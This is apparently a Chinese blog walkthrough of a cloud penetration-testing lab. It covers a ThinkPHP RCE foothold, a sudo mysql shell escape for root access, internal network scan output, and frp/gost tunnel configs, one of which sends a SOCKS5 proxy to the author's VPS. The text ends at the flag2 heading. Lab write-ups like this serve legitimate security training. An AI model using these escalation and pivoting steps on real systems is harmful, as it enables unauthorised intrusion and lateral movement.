<!doctype html><html lang=zh-CN data-theme=light><head><meta charset=UTF-8><meta name=viewport content="width=device-width"><meta name=theme-color content="#222" media="(prefers-color-scheme: light)"><meta name=generator content="Hugo 0.126.1"><link rel="shortcut icon" type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/png sizes=16x16 href=/imgs/icons/favicon_16x16_next.png><link rel=icon type=image/png sizes=32x32 href=/imgs/icons/favicon_32_32_next.png><link rel=apple-touch-icon sizes=180x180 href=/imgs/icons/apple_touch_icon_next.png><meta itemprop=name content="春秋云境 Initial"><meta itemprop=description content="集中一点,登峰造极"><meta name=description content="集中一点,登峰造极"><meta itemprop=datePublished zgotmplz><meta itemprop=dateModified zgotmplz><meta itemprop=image content="https://zp9080.github.io/imgs/author.png"><meta itemprop=keywords content="渗透"><meta property="og:type" content="article"><meta property="og:title" content="春秋云境 Initial"><meta property="og:description" content="集中一点,登峰造极"><meta property="og:image" content="/imgs/author.png"><meta property="og:image:width" content="312"><meta property="og:image:height" content="312"><meta property="og:image:type" content="image/jpeg/png/svg/jpg"><meta property="og:url" content="https://zp9080.github.io/post/%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-initial/"><meta property="og:site_name" content="f1ow-blog"><meta property="og:locale" content="zh-CN"><meta property="article:author" content="f1ow"><meta property="article:published_time" content="2024-10-19 23:43:08 +0800 CST"><meta property="article:modified_time" content="2024-10-19 23:43:08 +0800 CST"><link type=text/css rel=stylesheet href=https://zp9080.github.io/3rd/font-awesome/6.6.0/css/all.min.css><link type=text/css rel=stylesheet href=https://zp9080.github.io/3rd/animate.css/4.1.1/animate.min.css><link type=text/css rel=stylesheet href=https://zp9080.github.io/3rd/viewerjs/1.11.6/viewer.min.css><link rel=stylesheet href=/css/main.min.bfbac3431de920c11b5b1cafa45029ea1bc93d5d3da50fed4ab6924b4c250360.css><script type=text/javascript>(function(){localDB={set:function(e,t,n){if(n===0)return;const s=new Date,o=n*864e5,i={value:t,expiry:s.getTime()+o};localStorage.setItem(e,JSON.stringify(i))},get:function(e){const t=localStorage.getItem(e);if(!t)return void 0;const n=JSON.parse(t),s=new Date;return s.getTime()>n.expiry?(localStorage.removeItem(e),void 0):n.value}},theme={active:function(){const e=localDB.get("theme");if(e==null)return;theme.toggle(e),window.matchMedia("(prefers-color-scheme: dark)").addListener(function(e){theme.toggle(e.matches?"dark":"light")})},toggle:function(e){document.documentElement.setAttribute("data-theme",e),localDB.set("theme",e,2);const t=document.querySelector("iframe.giscus-frame");if(t){const n={setConfig:{theme:e}};t.contentWindow.postMessage({giscus:n},"https://giscus.app")}}},theme.active()})(window)</script><script class=next-config data-name=page type=application/json>{"comments":false,"isHome":false,"isPage":true,"path":"%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-initial","permalink":"https://zp9080.github.io/post/%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-initial/","title":"春秋云境 Initial","waline":{"js":[{"alias":"@waline/client","alias_name":"waline","file":"dist/pageview.js","name":"pageview","version":"2.15.8"},{"alias":"@waline/client","alias_name":"waline","file":"dist/comment.js","name":"comment","version":"2.15.8"}]}}</script><script type=text/javascript>document.addEventListener("DOMContentLoaded",()=>{var e=document.createElement("script");e.charset="UTF-8",e.src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js",e.async=!1,e.defer=!0,document.head.appendChild(e),e.onload=function(){NexT.utils.fmtBusuanzi()}})</script><title>春秋云境 Initial - f1ow-blog</title><noscript><link rel=stylesheet href=/css/noscript.css></noscript></head><body itemscope itemtype=http://schema.org/WebPage class=use-motion><div class=headband></div><div class=overlay></div><main class=main><header class=header itemscope itemtype=http://schema.org/WPHeader><div class=header-inner><div class=site-brand-container><div class=site-nav-toggle><div class=toggle aria-label role=button><span class=toggle-line></span>
<span class=toggle-line></span>
<span class=toggle-line></span></div></div><div class=site-meta><a href=/ class=brand rel=start><i class=logo-line></i><h1 class=site-title>f1ow-blog</h1><i class=logo-line></i></a><p class=site-subtitle itemprop=description>集中一点,登峰造极</p></div><div class=site-nav-right><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class=site-nav><ul class="main-menu menu"><li class="menu-item menu-item-home"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-home hvr-icon"></i>首页</a></li><li class="menu-item menu-item-about"><a href=/about/ class=hvr-icon-pulse rel=section><i class="fa fa-user hvr-icon"></i>关于</a></li><li class="menu-item menu-item-archives"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-archive hvr-icon"></i>归档
<span class=badge>207</span></a></li><li class="menu-item menu-item-categories"><a href=/categories/ class=hvr-icon-pulse rel=section><i class="fa fa-categories hvr-icon"></i>分类</a></li><li class="menu-item menu-item-tags"><a href=/tags/ class=hvr-icon-pulse rel=section><i class="fa fa-tags hvr-icon"></i>标签</a></li><li class="menu-item menu-item-search"><a role=button class="popup-trigger hvr-icon-pulse"><i class="fa fa-search fa-fw hvr-icon"></i>搜索</a></li></ul></nav><div class=search-pop-overlay><div class="popup search-popup"><div class=search-header><span class=search-icon><i class="fa fa-search"></i></span><div class=search-input-container><input autocomplete=off autocapitalize=off maxlength=80 placeholder=搜索... spellcheck=false type=search class=search-input></div><span class=popup-btn-close role=button><i class="fa fa-times-circle"></i></span></div><div class="search-result-container no-result"><div class=search-result-icon><i class="fa fa-spinner fa-pulse fa-5x"></i></div></div></div></div></div><div class="toggle sidebar-toggle" role=button><span class=toggle-line></span>
<span class=toggle-line></span>
<span class=toggle-line></span></div><aside class=sidebar><div class="sidebar-inner sidebar-nav-active sidebar-toc-active"><ul class=sidebar-nav><li class=sidebar-nav-toc>文章目录</li><li class=sidebar-nav-overview>站点概览</li></ul><div class=sidebar-panel-container><div class="post-toc-wrap sidebar-panel"><div class="post-toc animated"><nav id=TableOfContents><ul><li><a href=#第一阶段>第一阶段</a><ul><li><a href=#nmap>nmap</a></li><li><a href=#fscan>fscan</a></li><li><a href=#flag1>flag1</a></li></ul></li><li><a href=#第二阶段>第二阶段</a><ul><li><a href=#网段>网段</a></li><li><a href=#蚁剑的一个小毛病>蚁剑的一个小毛病</a></li><li><a href=#内网信息收集>内网信息收集</a></li><li><a href=#内网穿透>内网穿透</a><ul><li><a href=#方法一frp>方法一frp</a></li><li><a href=#方法二gost>方法二gost</a></li><li><a href=#内网穿透与burpsuite>内网穿透与burpsuite</a></li></ul></li><li><a href=#flag2>flag2</a></li></ul></li><li><a href=#第三阶段>第三阶段</a><ul><li><a href=#kali代理设置>kali代理设置</a></li><li><a href=#flag3>flag3</a></li><li><a href=#相关工具解释>相关工具解释</a></li></ul></li></ul></nav></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author site-overview-item animated" itemprop=author itemscope itemtype=http://schema.org/Person><img class=site-author-image itemprop=image alt=f1ow src=/imgs/img-lazy-loading.gif data-src=/imgs/author.png><p class=site-author-name itemprop=name>f1ow</p><div class=site-description itemprop=description>集中一点,登峰造极</div></div><div class="site-state-wrap site-overview-item animated"><nav class=site-state><div class="site-state-item site-state-posts"><a href=/archives/><span class=site-state-item-count>207</span>
<span class=site-state-item-name>日志</span></a></div><div class="site-state-item site-state-categories"><a href=/categories/><span class=site-state-item-count>38</span>
<span class=site-state-item-name>分类</span></a></div><div class="site-state-item site-state-tags"><a href=/tags/><span class=site-state-item-count>80</span>
<span class=site-state-item-name>标签</span></a></div></nav></div><div class="links-of-social site-overview-item animated"><span class=links-of-social-item><a href=https://github.com/zp9080 title="Github → https://github.com/zp9080" rel=noopener class=hvr-icon-pulse target=_blank><i class="fab fa-github fa-fw hvr-icon"></i>
Github</a></span></div><div class="cc-license animated" itemprop=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh class=cc-opacity rel=noopener target=_blank title=共享知识><img src=/imgs/img-lazy-loading.gif data-src=/imgs/cc/big/by_nc_sa.svg alt=共享知识></a></div><div class="links-of-blogroll site-overview-item animated"><div class=links-of-blogroll-title><i class="fa fa-globe fa-fw"></i>
友情链接</div><ul class=links-of-blogroll-list><li class=links-of-blogroll-item><a href=https://v3rdant.cn/ title=https://v3rdant.cn/ target=_blank>v3rdant</a></li><li class=links-of-blogroll-item><a href=https://juicymio.github.io/ title=https://juicymio.github.io/ target=_blank>juicymio</a></li><li class=links-of-blogroll-item><a href=https://ka7arotto.github.io/ title=https://ka7arotto.github.io/ target=_blank>Goku</a></li></ul></div></div></div></div><div id=siteinfo-card-widget class=sidebar-card-widget><div class=item-headline><i class="fas fa-chart-line"></i>
<span>网站资讯</span></div><div class=siteinfo><div class=siteinfo-item><div class=item-name><i class="fa-solid fa-calendar-check"></i>已运行：</div><div class=item-count id=runTimes data-publishdate=2024-07-28T00:00:00+00:00></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-user"></i>总访客数：</div><div class=item-count id=busuanzi_value_site_uv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-eye"></i>页面浏览：</div><div class=item-count id=busuanzi_value_site_pv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-font"></i>总字数：</div><div class=item-count id=wordsCount data-count=273686></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-mug-hot"></i>阅读约：</div><div class=item-count id=readTimes data-times=660></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-clock-rotate-left"></i>最后更新于：</div><div class=item-count id=last-push-date data-lastpushdate=2025-02-27T17:57:37+08:00></div></div></div></div></aside><div class=sidebar-dimmer></div></header><div class=tool-buttons><div id=toggle-theme class=button title=深浅模式切换><i class="fas fa-adjust"></i></div><div class=back-to-top role=button title=返回顶部><i class="fa fa-arrow-up"></i>
<span>0%</span></div></div><div class=reading-progress-bar></div><a role=button class="book-mark-link book-mark-link-fixed"></a><a href=https://github.com/zp9080 rel="noopener external nofollow noreferrer" target=_blank title="Follow me on GitHub" class="exturl github-corner"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0 0 115 115h15l12 27L250 250V0z"/><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentcolor" style="transform-origin:130px 106px" class="octo-arm"/><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4l13.9-13.8C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8z" fill="currentcolor" class="octo-body"/></svg>
</a><script type=text/javascript src=//sidecar.gitter.im/dist/sidecar.v1.js async></script><script type=text/javascript>((window.gitter={}).chat={}).options={room:"hugo-next/community"}</script><noscript><div class=noscript-warning>Theme NexT works best with JavaScript enabled</div></noscript><div class="main-inner post posts-expand"><div class=post-block><article itemscope itemtype=http://schema.org/Article class=post-content lang><link itemprop=mainEntityOfPage href=https://zp9080.github.io/post/%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-initial/><span hidden itemprop=author itemscope itemtype=http://schema.org/Person><meta itemprop=image content="/imgs/author.png"><meta itemprop=name content="f1ow"></span><span hidden itemprop=publisher itemscope itemtype=http://schema.org/Organization><meta itemprop=name content="f1ow"><meta itemprop=description content="集中一点,登峰造极"></span><span hidden itemprop=post itemscope itemtype=http://schema.org/CreativeWork><meta itemprop=name content="春秋云境 Initial"><meta itemprop=description content></span><header class=post-header><h1 class=post-title itemprop="name headline">春秋云境 Initial
<a href=https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name/post/%e6%b8%97%e9%80%8f/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83-Initial.md rel="noopener external nofollow noreferrer" target=_blank class="exturl post-edit-link" title=编辑><i class="fa fa-pen-nib"></i></a></h1><div class=post-meta-container><div class=post-meta-items><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-calendar"></i>
</span><span class=post-meta-item-text title=发表于>发表于：
</span><time title="创建时间：2024-10-19 23:43:08 +0800 CST" itemprop="dateCreated datePublished" datetime="2024-10-19 23:43:08 +0800 CST">2024-10-19
</time></span><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-folder-open"></i>
</span><span class=post-meta-item-text title=分类于>分类于：
</span><span itemprop=about itemscope itemtype=http://schema.org/Thing><a href=/categories/%E6%B8%97%E9%80%8F itemprop=url rel=index><span itemprop=name>渗透</span></a></span></span></div><div class=post-meta-items><span class=post-meta-item title=字数><span class=post-meta-item-icon><i class="fas fa-solid fa-file-word"></i>
</span><span class=post-meta-item-text>字数：</span>
<span>4630</span>
</span><span class=post-meta-item title=阅读><span class=post-meta-item-icon><i class="fas fa-solid fa-clock"></i>
</span><span class=post-meta-item-text>阅读：&ap;</span>
<span>10分钟</span>
</span><span class=post-meta-item title=浏览><span class=post-meta-item-icon><i class="fas fa-solid fa-eye"></i>
</span><span class=post-meta-item-text>浏览：
</span><span id=busuanzi_value_page_pv data-path=/post/%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-initial/><i class="fa fa-sync fa-spin"></i></span></span></div></div></header><div class="post-body autonumber" itemprop=articleBody><p>第一次玩渗透，玩的春秋云镜最简单的一个，做一下笔记</p><h1 id=第一阶段>第一阶段
<a class=header-anchor href=#%e7%ac%ac%e4%b8%80%e9%98%b6%e6%ae%b5></a></h1><p>打开题目给了个外网url，肯定是先扫看看有什么开着的服务，有如下两种方式</p><h2 id=nmap>nmap
<a class=header-anchor href=#nmap></a></h2><p><strong>第一种用nmap</strong>,最常见的一种用法如下 nmap –sT –sV -O url (-p &mldr;)</p><h2 id=fscan>fscan
<a class=header-anchor href=#fscan></a></h2><p><strong>第二种是用fscan</strong>，有时候它能直接扫出存在的cve，最常见的使用方法如下 .\fscan.exe -h url</p><h2 id=flag1>flag1
<a class=header-anchor href=#flag1></a></h2><p>fscan扫出来直接就有ThinkPHP 5.0.23的一个RCE漏洞，直接用工具打。
<a href=https://github.com/Lotus6/ThinkphpGUI title=ThinkphpGUI rel="noopener external nofollow noreferrer" target=_blank class=exturl>ThinkphpGUI
<i class="fa fa-external-link-alt"></i></a></p><p>打完之后就会给一个url和一个pass,用这个url和pass可以直接用蚁剑连接上去。然后查看当前权限</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#666>(</span>www-data:/var/www/html<span style=color:#666>)</span> $ whoami
</span></span><span style=display:flex><span>www-data
</span></span><span style=display:flex><span><span style=color:#666>(</span>www-data:/var/www/html<span style=color:#666>)</span> $ uname -a
</span></span><span style=display:flex><span>Linux ubuntu-web01 5.4.0-110-generic <span style=color:#080;font-style:italic>#124-Ubuntu SMP Thu Apr 14 19:46:19 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span>
</span></span><span style=display:flex><span><span style=color:#666>(</span>www-data:/var/www/html<span style=color:#666>)</span> $ id
</span></span><span style=display:flex><span><span style=color:#b8860b>uid</span><span style=color:#666>=</span>33<span style=color:#666>(</span>www-data<span style=color:#666>)</span> <span style=color:#b8860b>gid</span><span style=color:#666>=</span>33<span style=color:#666>(</span>www-data<span style=color:#666>)</span> <span style=color:#b8860b>groups</span><span style=color:#666>=</span>33<span style=color:#666>(</span>www-data<span style=color:#666>)</span>
</span></span><span style=display:flex><span><span style=color:#666>(</span>www-data:/var/www/html<span style=color:#666>)</span> $ sudo -l
</span></span><span style=display:flex><span>Matching Defaults entries <span style=color:#a2f;font-weight:700>for</span> www-data on ubuntu-web01:
</span></span><span style=display:flex><span>    env_reset, mail_badpass, <span style=color:#b8860b>secure_path</span><span style=color:#666>=</span>/usr/local/sbin<span style=color:#b62;font-weight:700>\:</span>/usr/local/bin<span style=color:#b62;font-weight:700>\:</span>/usr/sbin<span style=color:#b62;font-weight:700>\:</span>/usr/bin<span style=color:#b62;font-weight:700>\:</span>/sbin<span style=color:#b62;font-weight:700>\:</span>/bin<span style=color:#b62;font-weight:700>\:</span>/snap/bin
</span></span><span style=display:flex><span>User www-data may run the following commands on ubuntu-web01:
</span></span><span style=display:flex><span>    <span style=color:#666>(</span>root<span style=color:#666>)</span> NOPASSWD: /usr/bin/mysql
</span></span></code></pre></div><p>这说明我们可以通过通过sudo高权限运行mysql，进而能够执行 root权限才能执行的命令，可以参考下面这篇文章，里面也有讲很多种提取的方法渗透测试：
<a href=https://blog.csdn.net/Bossfrank/article/details/132035121 title="Linux提权精讲（三）之sudo方法第三期_nmap sudo 提权" rel="noopener external nofollow noreferrer" target=_blank class=exturl>Linux提权精讲（三）之sudo方法第三期_nmap sudo 提权
<i class="fa fa-external-link-alt"></i></a></p><p>这样就获得flag1了</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#666>(</span>www-data:/var/www/html<span style=color:#666>)</span> $ sudo mysql -e <span style=color:#b44>&#39;\! /bin/sh&#39;</span>
</span></span><span style=display:flex><span><span style=color:#666>(</span>www-data:/var/www/html<span style=color:#666>)</span> $ sudo mysql -e <span style=color:#b44>&#39;\! ls /root&#39;</span>
</span></span><span style=display:flex><span>flag
</span></span><span style=display:flex><span><span style=color:#666>(</span>www-data:/var/www/html<span style=color:#666>)</span> $ sudo mysql -e <span style=color:#b44>&#39;\! ls /root/flag&#39;</span>
</span></span><span style=display:flex><span>flag01.txt
</span></span><span style=display:flex><span><span style=color:#666>(</span>www-data:/var/www/html<span style=color:#666>)</span> $ sudo mysql -e <span style=color:#b44>&#39;\! cat /root/flag/flag01.txt&#39;</span>
</span></span><span style=display:flex><span> ██     ██ ██     ██       ███████   ███████       ██     ████     ██   ████████ 
</span></span><span style=display:flex><span>░░██   ██ ░██    ████     ██░░░░░██ ░██░░░░██     ████   ░██░██   ░██  ██░░░░░░██
</span></span><span style=display:flex><span> ░░██ ██  ░██   ██░░██   ██     ░░██░██   ░██    ██░░██  ░██░░██  ░██ ██      ░░ 
</span></span><span style=display:flex><span>  ░░███   ░██  ██  ░░██ ░██      ░██░███████    ██  ░░██ ░██ ░░██ ░██░██         
</span></span><span style=display:flex><span>   ██░██  ░██ ██████████░██      ░██░██░░░██   ██████████░██  ░░██░██░██    █████
</span></span><span style=display:flex><span>  ██ ░░██ ░██░██░░░░░░██░░██     ██ ░██  ░░██ ░██░░░░░░██░██   ░░████░░██  ░░░░██
</span></span><span style=display:flex><span> ██   ░░██░██░██     ░██ ░░███████  ░██   ░░██░██     ░██░██    ░░███ ░░████████ 
</span></span><span style=display:flex><span>░░     ░░ ░░ ░░      ░░   ░░░░░░░   ░░     ░░ ░░      ░░ ░░      ░░░   ░░░░░░░░  
</span></span><span style=display:flex><span>Congratulations!!! You found the first flag, the next flag may be in a server in the internal network.
</span></span><span style=display:flex><span>flag01: flag<span style=color:#666>{</span>60b53231-
</span></span></code></pre></div><h1 id=第二阶段>第二阶段
<a class=header-anchor href=#%e7%ac%ac%e4%ba%8c%e9%98%b6%e6%ae%b5></a></h1><p>从外网拿到shell后，接下来就是要考虑内网横向移动，我们的最终目的是获取域控上的 flag，我们先用蚁剑上传 fscan，扫描一下内网中有那些存活机器</p><p>这里要记得给fscan执行权限chmod 777 fscan，否则会执行不了。通过ip a我们可以发现网段为172.22.1.0/24</p><h2 id=网段>网段
<a class=header-anchor href=#%e7%bd%91%e6%ae%b5></a></h2><p>172.22.1.0/24 是一种表示 IP 地址范围的格式，叫做 CIDR（无类别域间路由，Classless Inter-Domain Routing）。它是一种灵活的方式来表示一个网络范围，不同于传统的 A、B、C 类 IP 划分方式。以下是 172.22.1.0/24 的具体含义和解释。</p><ol><li>IP 地址部分：172.22.1.0
172.22.1.0 是一个 IP 地址，表示一个子网的网络地址（network address）。
在 172.22.1.0/24 中，这个 IP 并不是表示单个设备，而是整个子网的网络部分。</li><li>子网掩码部分：/24
172.22.1.0/24 中的 /24 是子网掩码的简写，代表该子网的前 24 位用于标识网络部分，其余 8 位用于标识主机。
/24 对应的子网掩码是 255.255.255.0。它表示网络的前 24 位是固定的，后面的 8 位可以变化，用来分配给主机。</li><li>网络范围的计算
172.22.1.0/24 的含义是：</li></ol><p>网络地址：172.22.1.0 是网络的开始地址。
子网范围：从 172.22.1.1 到 172.22.1.254 是有效的主机 IP 地址。总共有 256 个 IP 地址（0-255），其中第一个地址（172.22.1.0）是网络地址，最后一个地址（172.22.1.255）是广播地址，剩余的 254 个地址（从 172.22.1.1 到 172.22.1.254）是可以分配给主机的</p><h2 id=蚁剑的一个小毛病>蚁剑的一个小毛病
<a class=header-anchor href=#%e8%9a%81%e5%89%91%e7%9a%84%e4%b8%80%e4%b8%aa%e5%b0%8f%e6%af%9b%e7%97%85></a></h2><ul><li>之前以为蚁剑很好用，但是会有个小毛病。如果命令行输出太多东西会卡住没显示，所以先把输出写到文件中，然后再cat比较好</li></ul><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-bash data-lang=bash><span style=display:flex><span>./fscan -h 172.22.1.0/24 &gt;&gt; out.txt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#666>(</span>www-data:/var/www/html<span style=color:#666>)</span> $ cat out.txt
</span></span><span style=display:flex><span>172.22.1.2:88 open
</span></span><span style=display:flex><span>172.22.1.18:80 open
</span></span><span style=display:flex><span>172.22.1.15:80 open
</span></span><span style=display:flex><span>172.22.1.15:22 open
</span></span><span style=display:flex><span>172.22.1.18:3306 open
</span></span><span style=display:flex><span>172.22.1.21:445 open
</span></span><span style=display:flex><span>172.22.1.18:445 open
</span></span><span style=display:flex><span>172.22.1.2:445 open
</span></span><span style=display:flex><span>172.22.1.21:139 open
</span></span><span style=display:flex><span>172.22.1.18:139 open
</span></span><span style=display:flex><span>172.22.1.2:139 open
</span></span><span style=display:flex><span>172.22.1.21:135 open
</span></span><span style=display:flex><span>172.22.1.18:135 open
</span></span><span style=display:flex><span>172.22.1.2:135 open
</span></span><span style=display:flex><span><span style=color:#666>[</span>*<span style=color:#666>]</span> NetInfo 
</span></span><span style=display:flex><span><span style=color:#666>[</span>*<span style=color:#666>]</span>172.22.1.2
</span></span><span style=display:flex><span>   <span style=color:#666>[</span>-&gt;<span style=color:#666>]</span>DC01
</span></span><span style=display:flex><span>   <span style=color:#666>[</span>-&gt;<span style=color:#666>]</span>172.22.1.2
</span></span><span style=display:flex><span><span style=color:#666>[</span>*<span style=color:#666>]</span> NetInfo 
</span></span><span style=display:flex><span><span style=color:#666>[</span>*<span style=color:#666>]</span>172.22.1.21
</span></span><span style=display:flex><span>   <span style=color:#666>[</span>-&gt;<span style=color:#666>]</span>XIAORANG-WIN7
</span></span><span style=display:flex><span>   <span style=color:#666>[</span>-&gt;<span style=color:#666>]</span>172.22.1.21
</span></span><span style=display:flex><span><span style=color:#666>[</span>*<span style=color:#666>]</span> WebTitle http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin
</span></span><span style=display:flex><span><span style=color:#666>[</span>*<span style=color:#666>]</span> OsInfo 172.22.1.2    <span style=color:#666>(</span>Windows Server <span style=color:#666>2016</span> Datacenter 14393<span style=color:#666>)</span>
</span></span><span style=display:flex><span><span style=color:#666>[</span>*<span style=color:#666>]</span> NetInfo 
</span></span><span style=display:flex><span><span style=color:#666>[</span>*<span style=color:#666>]</span>172.22.1.18
</span></span><span style=display:flex><span>   <span style=color:#666>[</span>-&gt;<span style=color:#666>]</span>XIAORANG-OA01
</span></span><span style=display:flex><span>   <span style=color:#666>[</span>-&gt;<span style=color:#666>]</span>172.22.1.18
</span></span><span style=display:flex><span><span style=color:#666>[</span>*<span style=color:#666>]</span> NetBios 172.22.1.2      <span style=color:#666>[</span>+<span style=color:#666>]</span> DC:DC01.xiaorang.lab             Windows Server <span style=color:#666>2016</span> Datacenter <span style=color:#666>14393</span>
</span></span><span style=display:flex><span><span style=color:#666>[</span>+<span style=color:#666>]</span> MS17-010 172.22.1.21    <span style=color:#666>(</span>Windows Server <span style=color:#666>2008</span> R2 Enterprise <span style=color:#666>7601</span> Service Pack 1<span style=color:#666>)</span>
</span></span><span style=display:flex><span><span style=color:#666>[</span>*<span style=color:#666>]</span> NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server <span style=color:#666>2008</span> R2 Enterprise <span style=color:#666>7601</span> Service Pack <span style=color:#666>1</span>
</span></span><span style=display:flex><span><span style=color:#666>[</span>*<span style=color:#666>]</span> NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server <span style=color:#666>2012</span> R2 Datacenter <span style=color:#666>9600</span>
</span></span><span style=display:flex><span><span style=color:#666>[</span>*<span style=color:#666>]</span> WebTitle http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m<span style=color:#666>=</span>login
</span></span><span style=display:flex><span><span style=color:#666>[</span>*<span style=color:#666>]</span> WebTitle http://172.22.1.18?m<span style=color:#666>=</span>login code:200 len:4012   title:信呼协同办公系统
</span></span><span style=display:flex><span><span style=color:#666>[</span>+<span style=color:#666>]</span> PocScan http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1
</span></span></code></pre></div><h2 id=内网信息收集>内网信息收集
<a class=header-anchor href=#%e5%86%85%e7%bd%91%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86></a></h2><p>172.22.1.2:DC域控
172.22.1.21:Windows的机器并且存在MS17-010 漏洞
172.22.1.18:信呼OA办公系统</p><p>而我们的最终目标即为DC域控，我们首先是对OA办公系统进行攻击，在这之前我们要先进行内网穿透，其目的是使我们能够在攻击机访问内网的服务</p><h2 id=内网穿透>内网穿透
<a class=header-anchor href=#%e5%86%85%e7%bd%91%e7%a9%bf%e9%80%8f></a></h2><h3 id=方法一frp>方法一frp
<a class=header-anchor href=#%e6%96%b9%e6%b3%95%e4%b8%80frp></a></h3><p>第一种方法frp，
<a href=https://github.com/fatedier/frp title=frp的github项目 rel="noopener external nofollow noreferrer" target=_blank class=exturl>frp的github项目
<i class="fa fa-external-link-alt"></i></a></p><p>其中frpc和frps是可执行文件，我们需要将frps和frps.ini上传到我们的vpsfrpc和frpc.ini上传到我们的靶机</p><p>下面是我相关文件的配置</p><ul><li>frpc.ini:</li></ul><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-ini data-lang=ini><span style=display:flex><span><span style=color:#b44>[common] </span>
</span></span><span style=display:flex><span><span style=color:#b44>server_addr</span> <span style=color:#666>=</span> <span style=color:#b44>123.249.99.71 # 我vps的ip地址</span>
</span></span><span style=display:flex><span><span style=color:#b44>server_port</span> <span style=color:#666>=</span> <span style=color:#b44>7000  </span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#b44>[socks5] </span>
</span></span><span style=display:flex><span><span style=color:#b44>type</span> <span style=color:#666>=</span> <span style=color:#b44>tcp   </span>
</span></span><span style=display:flex><span><span style=color:#b44>plugin</span> <span style=color:#666>=</span> <span style=color:#b44>socks5  </span>
</span></span><span style=display:flex><span><span style=color:#b44>remote_port</span> <span style=color:#666>=</span> <span style=color:#b44>798</span>
</span></span></code></pre></div><ul><li>frps.ini:</li></ul><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-ini data-lang=ini><span style=display:flex><span><span style=color:#a2f;font-weight:700>[common]</span>
</span></span><span style=display:flex><span><span style=color:#b44>bind_port</span> <span style=color:#666>=</span> <span style=color:#b44>7000</span>
</span></span></code></pre></div><p>这里要确保你的 vps 开启了 7000 和 798 端口，在vps执行./frps -c frps.ini 、然后在靶机执行./frpc -c frpc.ini</p><ul><li><strong>最后一步是用proxifier设置全局代理，注意这里的Address设置为vps的地址，端口为798</strong></li></ul><h3 id=方法二gost>方法二gost
<a class=header-anchor href=#%e6%96%b9%e6%b3%95%e4%ba%8cgost></a></h3><p>第二种方法是用gost这个，这个不需要vps都可以使用，
<a href=https://github.com/ginuerzh/gost title=gost的github项目 rel="noopener external nofollow noreferrer" target=_blank class=exturl>gost的github项目
<i class="fa fa-external-link-alt"></i></a></p><p>最常见的用法就是通过外网RCE后，把gost这个可执行文件传上去，然后gost -L=:8080，这个会作为标准HTTP/SOCKS5代理</p><p><strong>最后一步也是设置全局代理，但是注意这里的Address为题目的外网地址，端口为8080</strong></p><h3 id=内网穿透与burpsuite>内网穿透与burpsuite
<a class=header-anchor href=#%e5%86%85%e7%bd%91%e7%a9%bf%e9%80%8f%e4%b8%8eburpsuite></a></h3><p>内网穿透后避免不了还想要抓包分析，穿透之后的burpsuite的proxy还是设置的和SwitchyOmega里面的一样就可以抓包了</p><h2 id=flag2>flag2
